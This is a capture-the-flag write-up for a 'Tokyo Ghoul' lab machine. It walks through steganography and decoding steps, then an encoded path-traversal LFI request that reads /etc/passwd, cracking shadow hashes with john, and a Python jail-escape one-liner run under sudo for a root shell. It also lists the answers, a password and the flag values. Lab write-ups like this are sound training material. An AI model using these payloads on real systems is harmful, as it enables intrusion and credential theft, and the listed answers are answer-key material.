# Tokyo Ghoul-password hash expose (LFI)

```
export IP=10.10.75.135
```

# Material needed

1. Reverse engineering "need_to_talk"

```
file need_to_talk  # find format file
strings need_to_talk  # find the code to execute
./need_to_talk

> kamishiro

# Result: You_found_1t
```

2. Reverse engineering "rize_and_kaneki.jpg"

```
steghide --extract -sf rize_and_kaneki.jpg
Enter passphrase: You_found_1t
```

3. Reverse engineering "yougotme.txt"

```
Morse decoder
ASCII to hex: 5A4446794D324D334D484A3558324E6C626E526C63673D3D
base64 decode: ZDFyM2M3MHJ5X2NlbnRlcg==

# Result: d1r3c70ry_center 
```

4. LFI bypass protection 

```
curl http://10.10.75.135/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd 
```

5. Crack user password

```
unshadow passwd shadow > password
john --wordlist=/root/Documents/wordlist/rockyou.txt password
```

6. Privilege escalation

```
sudo /usr/bin/python3 /home/kamishiro/jail.py
>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['EXECL'.lower()]('/bin/sh','sh','-p')
```

# Tasks

1. How many ports are open ? 3

2. What is the OS used ? Ubuntu

3. Did you find the note that the others ghouls gave you? where did you find it ? jasonroom.html

4. What is the key for Rize executable? kamisihiro

5. What the message mean did you understand it ? what it says? d1r3c70ry_center

6. what is rize username ? kamishiro

7. what is rize password ? password123

8. user.txt

```
e6215e25c0783eb4279693d9f073594a
```

9. root.txt
 
```
9d790bb87898ca66f724ab05a9e6000b
```